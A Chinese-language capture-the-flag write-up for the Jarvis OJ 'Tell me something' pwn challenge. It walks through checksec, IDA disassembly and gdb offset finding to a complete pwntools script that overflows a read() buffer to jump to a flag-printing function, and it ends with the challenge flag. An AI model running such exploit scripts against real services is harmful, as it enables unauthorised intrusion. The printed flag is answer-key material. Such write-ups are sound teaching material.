# [Jarvis OJ] PWN Tell me something

> nc pwn.jarvisoj.com 9876

首先下载文件使用checksec查看保护措施：
```
[*] '/root/pwn/guestbook.d3d5869bd6fb04dd35b29c67426c0f05'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found       //没有堆栈保护
    NX:       NX enabled            //堆栈不可执行
    PIE:      No PIE (0x400000)
```

放入IDA进行查看
```C
; int __cdecl main(int argc, const char **argv, const char **envp)
public main
main proc near
; __unwind {
sub     rsp, 88h
mov     edx, 14h        ; n
mov     esi, offset aInputYourMessa ; "Input your message:\n"
mov     edi, 1          ; fd
call    _write
mov     rsi, rsp        ; buf
mov     edx, 100h       ; nbytes
xor     edi, edi        ; fd
call    _read
mov     edx, 29h        ; n
mov     esi, offset aIHaveReceivedY ; "I have received your message, Thank you"...
mov     edi, 1          ; fd
call    _write
add     rsp, 88h
retn
; } // starts at 4004E0
main endp
```
main函数里面进行了基本的交互，在这里面有一个非常值得关注的read函数，很可能造成溢出，控制rip。

使用shift+f12查看字符串信息
```
.rodata:0000000000400714 modes           db 'r',0                ; DATA XREF: good_game+1↑o
.rodata:0000000000400716 ; char filename[]
.rodata:0000000000400716 filename        db 'flag.txt',0         ; DATA XREF: good_game+6↑o
.rodata:000000000040071F aInputYourMessa db 'Input your message:',0Ah,0
.rodata:000000000040071F                                         ; DATA XREF: main+C↑o
.rodata:0000000000400734                 align 8
.rodata:0000000000400738 aIHaveReceivedY db 'I have received your message, Thank you!',0Ah,0
.rodata:0000000000400738                                         ; DATA XREF: main+2F↑o
```

发现在good_game处引用了flag.txt，于是跟进这个函数发现是读取当前路径下flag.txt并将内容写入标准输出。

于是思路就很明确了，在main函数中通过read函数的读取溢出控制RIP指向good_game函数地址。
然后就能得到flag。

我们可以通过pattern.py测试需要输入多少字符能造成溢出。
>root@01da7a55bcdc:~/pwn# python pattern.py create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
使用gdb调试发现
```
pwndbg> r
Starting program: /root/pwn/guestbook.d3d5869bd6fb04dd35b29c67426c0f05 
Input your message:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
I have received your message, Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400525 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x29
 RBX  0x0
*RCX  0x7ffff7b042c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
*RDX  0x29
*RDI  0x1
*RSI  0x400738 ◂— and    byte ptr [r8 + 0x61], bpl
*R8   0x400700 (__libc_csu_fini) ◂— ret    
*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
*R10  0x37b
*R11  0x246
*R12  0x400526 (_start) ◂— xor    ebp, ebp
*R13  0x7fffffffe6d0 ◂— 0x1
 R14  0x0
 R15  0x0
*RBP  0x400690 (__libc_csu_init) ◂— push   r15
*RSP  0x7fffffffe5f8 ◂— 0x3765413665413565 ('e5Ae6Ae7')
*RIP  0x400525 (main+69) ◂— ret    
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x400525 <main+69>    ret    <0x3765413665413565>
```
这样发现填充后通过控制0xe5Ae6Ae7的位置可以控制RIP
>root@01da7a55bcdc:~/pwn# python pattern.py offset e5Ae6Ae7
136

知道填充位有136bytes

于是写出攻击脚本
```python
#coding = utf-8
from pwn import *

debug = False

HOST = 'pwn.jarvisoj.com'
PORT = 9876

getflag = 0x400620


if debug:
	p = process('./guestbook.d3d5869bd6fb04dd35b29c67426c0f05')

else :
	p = remote(HOST,PORT)

payload = 'a'*136+p64(getflag)
p.recvuntil('message:')
p.sendline(payload)
p.interactive()
```

执行后返回flag
```
root@01da7a55bcdc:~/pwn# python exp.py 
[+] Opening connection to pwn.jarvisoj.com on port 9876: Done
[*] Switching to interactive mode
I have received your message, Thank you!
PCTF{This_is_J4st_Begin}
```


